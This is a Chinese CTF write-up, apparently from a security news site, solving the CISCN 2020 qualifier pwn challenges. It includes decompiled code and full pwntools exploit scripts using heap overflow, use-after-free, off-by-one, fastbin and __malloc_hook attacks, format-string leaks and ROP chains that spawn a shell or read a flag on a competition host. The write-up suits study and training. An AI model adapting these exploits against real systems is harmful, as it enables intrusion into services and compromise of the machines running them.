# CISCN 2020 初赛Pwn

阅读量 **259366**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-08-24 14:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t013b388436a494bd8f.png)

## 前言

pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。

## 题解

###  babyjsc

这题我附件都没搞下来就被秒得稀烂了，最后队友说就是个python2会eval输入的内容（最后附件我也没搞下来，速度太慢了），反正是个水题。

###  nofree

  1. 只有两个功能，一个`new`（这个`malloc`是我自己命名的，只是为了方便看，实际上是通过`strdup`里的`malloc`进行分配的）： 
    
         int new()
     {
       int result; // eax
       int v1; // [rsp+8h] [rbp-8h]
       int v2; // [rsp+Ch] [rbp-4h]
    
       result = get_idx();
       v1 = result;
       if ( result != -1 )
       {
         printf("size: ");
         result = choice();
         v2 = result;
         if ( result >= 0 && result <= 0x90 )
         {
           *(_QWORD *)&chunk_array[16 * v1 + 256] = malloc(result);
           result = v2;
           *(_QWORD *)&chunk_array[16 * v1 + 264] = v2;
         }
       }
       return result;
     }
    
     char *__fastcall malloc(unsigned int a1)
     {
       memset(chunk_array, 0, 0x100uLL);
       printf("content: ");
       read_str(chunk_array, a1);
       return strdup(chunk_array);
     }
    

一个`edit`：

    
         __int64 edit()
     {
       __int64 result; // rax
       int v1; // [rsp+Ch] [rbp-4h]
    
       result = get_idx();
       v1 = result;
       if ( (_DWORD)result != -1 )
       {
         result = *(_QWORD *)&chunk_array[16 * (int)result + 256];
         if ( result )
         {
           printf("content: ");
           result = read_str(*(void **)&chunk_array[16 * v1 + 256], *(_QWORD *)&chunk_array[16 * v1 + 264]);
         }
       }
       return result;
     }
    

  2. 显然这里`add`功能里输入的size，和`strdup`实际`malloc`出来的size并不一定是对应的，所以在`edit`的时候可以有heap overflow。
  3. 无`free`，就直接house of orange了，不过这里是把top chunk扔到`0x70`的fastbin里面去，然后利用heap overflow改fd指向bss上chunk array的地方，size是可以通过`new`功能那里控制的，正好可以控制分配到`chunk[1]`的位置而且不破坏`chunk[0]`，从而达到任意地址写。
  4. 因为同样没有`show`，这里我的思路是： 
    * 改`atoi_got`为`printf_plt`，并且把`exit_got`改为`ret`，这样就可以利用`atoi`引入格式化字符串漏洞，同时`choice`错误的情况下能继续执行程序而不exit。
    * 然后利用格式化字符串漏洞把`libc_read`和`stack address`全leak出来。
  5. 由于查不到libc的版本，所以只能后面的思路就是想办法打syscall，但是ROPgadget是搜不到syscall的。这里就利用`libc_read + 0xe`的地方就是一个`syscall`的gadget，来进行后续的syscall调用。
  6. 至于`rdi`，`rsi`，`rdx`可以通过通用gadget控制，最关键的是`rax`，这里采用调用`read`的方法，因为函数的返回值等于读入的字符串的长度，所以只要控制读入`0x3b`长度字符串，就控制`rax = 0x3b`了。
  7. 最后就直接构造rop，利用任意地址写覆盖`edit`的返回地址即可。
  8. 拿完shell直接查靶机的libc：`Ubuntu GLIBC 2.23-0ubuntu11.2`，后面方便很多。
  9. exp仅供参考： 
    
         p = remote('101.200.53.148', 12301)
    
     def add(idx, size, content):
         p.sendlineafter("choice>> ", "1")
         p.sendlineafter("idx: ", str(idx))
         p.sendlineafter("size: ", str(size))
         p.sendafter("content: ", content)
    
     def add_s(idx, size, content):
         p.sendafter("choice>> ", "1\x00")
         if idx == 0:
             p.sendafter("idx: ", "\x00")
         else:
             p.sendafter("idx: ", "1" * idx + '\x00')
         p.sendlineafter("size: ", "%" + str(size) + "c")
         p.sendafter("content: ", content)
    
     def edit(idx, content):
         p.sendlineafter("choice>> ", "2")
         p.sendlineafter("idx: ", str(idx))
         p.sendafter("content: ", content)
    
     def edit_s(idx, content):
         p.sendafter("choice>> ", "11\x00")
         if idx == 0:
             p.sendafter("idx: ", "\x00")
         else:
             p.sendafter("idx: ", "1" * idx + "\x00")
         p.sendafter("content: ", content)
    
     atoi_got = elf.got['atoi']
     exit_got = elf.got['exit']
     read_got = elf.got['read']
     printf_got = elf.got['printf']
     printf_plt = elf.plt['printf']
     ret = 0x00000000004006b9 # ret
    
     # hijack chunk array
     add(0, 0x80, "AAA\x00")
     edit(0, "A" * 0x18 + p64(0xfe1))
     for i in range(24):
         add(0, 0x90, "B" * 0x90)
     add(0, 0x90, "A" * 0x30)
     add(1, 0x90, "A" * 0x88 + p64(0x81))
     edit(0, "A" * 0x38 + p64(0x81) + p64(0x6020C0 + 0x100))
     add(0, 0x81, "A" * 0x77)
     add(0, 0x81, "A" * 0x77)
    
     # write atoi_got table
     edit(0, p64(atoi_got) + p64(0x100))
     edit(1, p64(printf_plt))
     edit_s(0, p64(exit_got) + p64(0x100))
     edit_s(1, p64(ret))
    
     # leak read to get syscall gadget
     payload = "%7$s%8$s" + p64(read_got) + p64(printf_got)
     p.sendlineafter("choice>> ", payload)
     libc_read = u64(p.recv(6).ljust(8, "\x00"))
     syscall = libc_read + 0xE
     libc_printf = u64(p.recv(6).ljust(8, "\x00"))
    
     # leak stack
     payload = "%12$p"
     p.sendlineafter("choice>> ", payload)
     p.recvuntil("0x")
     stack_addr = int(p.recv(12), 16)
    
     # write gadget
     pop_rdi = 0x0000000000400c23 # pop rdi ; ret
     pop_rsi = 0x0000000000400c21 # pop rsi ; pop r15 ; ret
    
     gadget_1 = 0x400C00
     gadget_2 = 0x400C16
    
     edit_s(0, p64(stack_addr + 8) + p64(0x300) + "/bin/sh\x00" + p64(syscall))
     payload = flat([pop_rdi, 0, pop_rsi, stack_addr + 0xB8, 0, libc_read]) # control rax
     payload += flat([gadget_2, 0, 0, 1, 0x6020C0  + 0x128, 0, 0, 0x6020C0 + 0x120])
     payload += flat([gadget_1, 0, 0, 0, 0, 0, 0, 0])
     # raw_input()
     edit_s(1, payload)
    
     sleep(2)
     p.send('A' * 0x3b)
    
     '''
     .text:0000000000400C00 loc_400C00: 
     .text:0000000000400C00                 mov     rdx, r13
     .text:0000000000400C03                 mov     rsi, r14
     .text:0000000000400C06                 mov     edi, r15d
     .text:0000000000400C09                 call    qword ptr [r12+rbx*8]
     .text:0000000000400C0D                 add     rbx, 1
     .text:0000000000400C11                 cmp     rbx, rbp
     .text:0000000000400C14                 jnz     short loc_400C00
     .text:0000000000400C16
     .text:0000000000400C16 loc_400C16:                             ; CODE XREF: init+34↑j
     .text:0000000000400C16                 add     rsp, 8
     .text:0000000000400C1A                 pop     rbx
     .text:0000000000400C1B                 pop     rbp
     .text:0000000000400C1C                 pop     r12
     .text:0000000000400C1E                 pop     r13
     .text:0000000000400C20                 pop     r14
     .text:0000000000400C22                 pop     r15
     .text:0000000000400C24                 retn
     '''
    
     success("libc_read: " + hex(libc_read))
     success("libc_printf: " + hex(libc_printf))
     success("stack_addr: " + hex(stack_addr))
    
     p.interactive()
    

###  maj

  1. 比较常规的利用方法，给了四个功能实际上只有三个有效，分别是： 
    * `add`功能： 
        
                  v10 = __readfsqword(0x28u);
          puts("please answer the question\n");
          _isoc99_scanf("%d", &v8);
          if ( !sub_400B2B(v8) )
          exit(0);
          puts("you are right\n");
          for ( i = 0; i <= 31 && buf[i]; ++i )
          ;
          if ( i == 32 )
          {
              puts("full!");
          }
          else
          {
          puts("______?");
          _isoc99_scanf("%d", &v7);
          if ( v7 >= 0 && v7 <= 4096 )
          {
              buf[i] = malloc(v7);
              puts("start_the_game,yes_or_no?");
              read(0, &unk_603060, 0x100uLL);
              ......
              snprintf(byte_6033E0, v7, "%s", &unk_603060);// here
              ......
              size[i] = v5;
          }
          else
          {
              size[i] = v7;
          }
        

中间那部分基本不用管（整个过程下来没有影响），那个`answer
question`只要简单爆一下就能知道80这个数字可用，后面基本就是根据输入的size去`malloc`一个chunk，然后通过`snprintf`把输入写到chunk里面，size写到bss上。

    * `delete`: 
        
                  v4 = __readfsqword(0x28u);
          puts("index ?");
          _isoc99_scanf("%d", &v3);
          if ( v3 >= 0 && v3 <= 31 && buf[v3] )
          {
              ......
              free(buf[v3]);
          }
        

中间逻辑一样不用管，就是个直接`free`没有清空指针。

    * `edit`： 
        
                  unsigned __int64 edit()
          {
              int v0; // eax
              int v1; // eax
              int v3; // [rsp+4h] [rbp-Ch]
              unsigned __int64 v4; // [rsp+8h] [rbp-8h]
        
              v4 = __readfsqword(0x28u);
              puts("index ?");
              _isoc99_scanf("%d", &v3);
              if ( v3 >= 0 && v3 <= 31 && buf[v3] )
              {
                  puts("__new_content ?");
                  if ( val_100 <= val_0 )
                        v0 = dword_603040;
                  else
                        v0 = val_0;
                  if ( v0 <= val_100 && val_0 > dword_603040 || dword_603040 <= val_0 )
                        v1 = val_0;
                  else
                       v1 = dword_603040;
                  val_0 = v1;
                  read(0, buf[v3], size[v3]);
                  puts("done");
              }
              else
              {
                  puts("invalid index");
              }
                return __readfsqword(0x28u) ^ v4;
          }
        

  2. 显然这里存在一个uaf，直接先通过uaf，形成chunk overlap，使得同一个chunk同时存在于unsorted bin和fastbin（`size = 0x70`）中，这样`fastbin->fd = main_arena + 0x58`。
  3. 由于没有`show`，通用的办法就是通过上述构造，对`fastbin->fd`进行partial write 2 byte，所以只要bruteforce 4 bits，就能通过fastbin attack分配到`stdout`结构体的上方，然后将: 
    
         _flags = 0xfbad1800
     _IO_read_ptr = 0
     _IO_read_end = 0
     _IO_read_base = 0
     _IO_write_base = 0xXXXXXXXXXXXXXX00
    

就能leak出缓冲区的内存，从而leak出libc地址。

  4. 由于通过nofree那题拿到了libc版本，所以后面就是利用uaf打`__malloc_hook`为`onegadget`即可。
  5. exp仅供参考： 
    
         p = remote('101.200.53.148', 15423)
    
     def add(num, size, content):
         p.sendlineafter(">> ", "1")
         p.sendlineafter("please answer the question", str(num))
         p.sendlineafter('______?', str(size))
         p.sendlineafter("start_the_game,yes_or_no?", content)
    
     def delete(idx):
         p.sendlineafter(">> ", "2")
         p.sendlineafter("index ?", str(idx))
    
     def edit(idx, content):
         p.sendlineafter(">> ", "4")
         p.sendlineafter("index ?", str(idx))
         p.sendafter("__new_content ?", content)
    
     main_arena_offset = 0x3c4b20
     __malloc_hook_offset = libc.sym["__malloc_hook"]
     one_gadget_offset = 0xf1207
    
     while True:
         try:
             add(80, 0x28, "AAAA") # chunk 0
             add(80, 0x28, "BBBB") # chunk 1
             add(80, 0x28, "CCCC") # chunk 2
             for i in range(4):
                 add(80, 0x68, "DDDD") # chunk 3 4 5 6
    
             delete(3)
    
             # chunk overlap
             delete(2)
             delete(0)
             edit(0, '\x10')
             add(80, 0x28, "DDDD") # chunk 7
             edit(7, (p64(0) + p64(0x31)) * 2)
             add(80, 0x28, "EEEE") # chunk 8
             edit(8, p64(0) * 3 + p64(0xd1))
    
             # unsorted bin
             delete(1)
             add(80, 0x58, "FFFF") # chunk 9
    
             # bruteforce 4 bits
             edit(3, "\xdd\x55")
             add(80, 0x68, "GGGG") # chunk 10
    
             # leak
             add(80, 0x68, "HHHH") # chunk 11
             edit(11, "\x00" * 0x33 + p64(0xfbad1800) + p64(0) * 3 + "\x00")
             p.recvline()
             p.recv(0x40)
             libc_base = u64(p.recv(8)) - 0x3c5600
             __malloc_hook = libc_base + __malloc_hook_offset
             one_gadget = libc_base + one_gadget_offset
    
             break
    
         except:
             print("failed")
             p.close()
             p = remote('101.200.53.148', 15423)
             # p = process(argv=[_proc], env=_setup_env())
    
     print("success")
    
     edit(11, p64(libc_base + main_arena_offset + 0x58) * 2)
    
     # uaf
     add(80, 0x68, "AAAA") # chunk 12
     delete(12)
     edit(12, p64(__malloc_hook - 0x23))
     add(80, 0x68, "BBBB") # chunk 13
     add(80, 0x68, "CCCC") # chunk 14
     edit(14, '\x00' * 0x13 + p64(one_gadget))
    
     # trigger
     p.sendlineafter(">> ", "1")
     p.sendlineafter("please answer the question", str(80))
     p.sendlineafter('______?', str(0x38))
    
     success("libc_base: " + hex(libc_base))
     success("one_gadget: " + hex(one_gadget))
     p.sendline(token)
    
     p.interactive()
    

###  easybox

思路和上一题一样。

  1. 两个功能： 
    * `add`： 
        
                  unsigned __int64 add()
          {
                unsigned __int64 v1; // [rsp+8h] [rbp-18h]
                unsigned __int64 size; // [rsp+10h] [rbp-10h]
                unsigned __int64 v3; // [rsp+18h] [rbp-8h]
        
                v3 = __readfsqword(0x28u);
                puts("idx:");
                v1 = choice();
                if ( v1 > 0xF )
                {
                  puts("error.");
                  exit(1);
                }
                puts("len:");
                size = choice();
                if ( size > 0xFFF )
                {
                  puts("error.");
                  exit(1);
                }
                chunk_size[v1] = size + 1;
                chunk_array[v1] = malloc(size);
                puts("content:");
                read(0, chunk_array[v1], chunk_size[v1]);
                return __readfsqword(0x28u) ^ v3;
          }
        

直接就是一个off by one。

    * `delete`： 
        
                  unsigned __int64 delete()
          {
            unsigned __int64 v1; // [rsp+0h] [rbp-10h]
            unsigned __int64 v2; // [rsp+8h] [rbp-8h]
        
            v2 = __readfsqword(0x28u);
            puts("idx:");
            v1 = choice();
            if ( v1 > 0xF || !chunk_array[v1] )
            {
              puts("error.");
              exit(1);
            }
            free(chunk_array[v1]);
            chunk_array[v1] = 0LL;
            chunk_size[v1] = 0LL;
            return __readfsqword(0x28u) ^ v2;
          }
        

删得很彻底。

  2. 直接利用off by one，构造chunk overlap，因为没有`show`，所以同样使得同一个chunk同时存在于unsorted bin和fastbin（`size = 0x70`）中，这样`fastbin->fd = main_arena + 0x58`；然后partial write，bruteforce，write stdout， leak。
  3. 然后再利用chunk overlap，fastbin attack打`__malloc_hook`为`onegadget`即可。
  4. exp仅供参考： 
    
         p = remote('101.200.53.148', 34521)
    
     def add(idx, len, content):
         p.sendlineafter(">>>", "1")
         p.sendlineafter("idx:", str(idx))
         p.sendlineafter("len:", str(len))
         p.sendafter("content:", content)
    
     def delete(idx):
         p.sendlineafter(">>>", "2")
         p.sendlineafter("idx:", str(idx))
    
     stdout_offset = 0x3c5620
     __malloc_hook_offset = libc.sym["__malloc_hook"]
     one_gadget_offset = 0xf1207
    
     while True:
         try:
             # chunk overlap
             add(0, 0x28, "AAAA")
             add(1, 0x28, "BBBB")
             delete(0)
             add(2, 0x68, "CCCC")
             delete(2)
             add(0, 0x28, "A" * 0x28 + "\xa1")
             add(3, 0x28, "DDDD")
             delete(1)
    
             # partial write
             add(1, 0x28, "B" * 0x28 + "\x61")
             delete(1)
             add(4, 0x58, p64(stdout_offset - 0x43)[:2])
             add(1, 0x28, "B" * 0x28 + "\x71")
    
             # leak
             add(5, 0x68, "EEEE")
             add(6, 0x68, "\x00" * 0x33 + p64(0xfbad1800) + p64(0) * 3 + "\x00")
             p.recvline()
             p.recv(0x40)
             libc_base = u64(p.recv(8)) - 0x3c5600
             __malloc_hook = libc_base + __malloc_hook_offset
             one_gadget = libc_base + one_gadget_offset
    
             break
    
         except:
             print("Failed")
             p.close()
             p = remote('101.200.53.148', 34521)
    
     print("Success")
    
     # chunk overlap
     add(7, 0x28, "AAAA")
     add(8, 0x28, "BBBB")
     delete(7)
     add(9, 0x68, "CCCC")
     delete(9)
     add(7, 0x28, "A" * 0x28 + "\xa1")
     add(10, 0x28, "DDDD")
     delete(8)
    
     # __malloc_hook
     add(8, 0x38, "E" * 0x28 + p64(0x71) + p64(__malloc_hook - 0x23))
     add(9, 0x68, "FFFF")
     add(11, 0x68, "G" * 0x13 + p64(one_gadget))
    
     # trigger
     p.sendlineafter(">>>", "1")
     p.sendlineafter("idx:", str(12))
     p.sendlineafter("len:", str(0x48))
    
     success("libc_base: " + hex(libc_base))
     success("__malloc_hook: " + hex(__malloc_hook))
     success("one_gadget: " + hex(one_gadget))
    
     p.sendline("token")
     p.interactive()
    

###  wow

主要就是逆向这个binary，搞清楚逻辑后难度就降低了。

  1. 主要就是程序在栈上开辟了一块0x400的地址作为虚拟栈，然后指令就是`~@#$^&|*{}`这几个，前面的几个很容易看出来就是对虚拟栈进行一些基本的操作，主要是后面这两个`{}`，队友说是像一些红黑树（实际上后来发现并不重要），重点在于： 
    * `{`和`}`可以理解为条件跳转指令，如果当前虚拟栈上的值不为0，那么`{}`中间的指令就会得到执行。
    * 执行到`}`的时候，同样检查虚拟栈上的值不为0的话，就会重新跳回`{`执行，相当于一个循环操作（这里可以解释为什么`~{}`指令会造成程序死循环了）。
  2. 之后在这个基础上，尝试输入一些payload，发现`~{@~}`会打印出”\xFF\xFF\xFF\xFF”（在没有aslr的情况下），由于程序中打印code用的就是一个`code_buf`指针，这里显然是指针被改了。
  3. 调试后发现，原因在于执行过程中，存在一个1 byte溢出，将虚拟栈后面的指针低字节给覆盖了，而这个指针，正好就是指向输入的指令；那么，此时相当于我们可以修改指令buf的位置，向栈上附近的位置写入任意值。
  4. 同时可以发现： 
    
         while ( 1 )
     {
         read(0LL, &tmp, 1LL);
         chr = tmp;
         if ( tmp == 10 )
               break;
         index = len;
         len_inc = len + 1;
         if ( code_buf == (__int64 *)&code )
               v11 = 15LL;
         else
               v11 = code;
         if ( len_inc > v11 )
              realloc(&code_buf, len, 0LL, 0LL, 1LL);
         *((_BYTE *)code_buf + index) = chr;
         len = len_inc;
         *((_BYTE *)code_buf + index + 1) = 0;
     }
    

这里因为`code_buf`被改了，造成`code_buf == (__int64
*)&code`没有满足，`v11`就被赋值为上一次输入的指令值了，也就是说就是一个很大的值，从而`realloc`不会因为指令的长度超过15而被调用从而将`code_buf`指向heap上。

  5. 因此，利用的思路就很清晰了，就是利用溢出将`code_buf`指向`return address`，然后写入orw的rop拿flag，但是需要注意的，避开地址包含有效指令的gadget（或者进行计算）。
  6. 这样rop打return address后发现还是会crash，其实程序还有个检查`code_buf`的位置： 
    
         if ( code_buf != (__int64 *)&code )
         sub_405C90((__int64)code_buf);
    

也就是说要绕过这个check，还必须将`code_buf`改回来，那么其实可以在rop的末尾添加指令改回来即可（因为解析指令的时候如果遇到非指令字符是会跳过的）。

  7. 改回来后再触发rop即可。
  8. `exp`仅供参考： 
    
         p = remote('101.200.53.148', 15324)
    
     syscall = 0x00000000004dc054 # syscall ; ret
     pop_rdi = 0x000000000041307a # pop rdi ; pop ...; ret
     pop_rsi = 0x000000000047383d # pop rsi ; pop ...; ret
     pop_rdx = 0x000000000053048b # pop rdx ; pop ...; ret
     pop_rax = 0x000000000053048a # pop rax ; pop ...; pop ...; ret
     def call(rax, rdi=0, rsi=0, rdx=0):
         return flat([pop_rax, rax, 0, 0, pop_rdi, rdi, 0, pop_rsi, rsi, 0, pop_rdx, rdx, 0, syscall])
    
     p.sendlineafter("enter your code:\n", "~{@&$}")
     p.send("A" * 0x3FF)
     p.recvuntil("\nrunning....\n")
     sleep(0.2)
     p.recvuntil("\x00" * 0x3FF)
     val = ord(p.recv(1))
     p.send(chr((val + 0x58) & 0xFF))
     p.sendafter("continue?", "Y")
     sleep(1)
     payload = call(0, 0, 0x5D3700, 0x10)
     payload += call(2, 0x5D3700, 0, 0)
     payload += call(0, 3, 0x5D3700 + 0x10, 0x50)
     payload += call(1, 1, 0x5D3700 + 0x10, 0x50)
     p.sendlineafter("enter your code:\n", payload + "~{@&$}")
     p.send("A" * 0x3FF)
     p.send(chr(val))
     p.sendafter("continue?", "N")
     p.send("/flag\x00"))
    
     p.interactive()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **N0p** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/215100](/post/id/215100)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p1.ssl.qhimg.com/t01ec7c9b5360104760.png) N0p

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

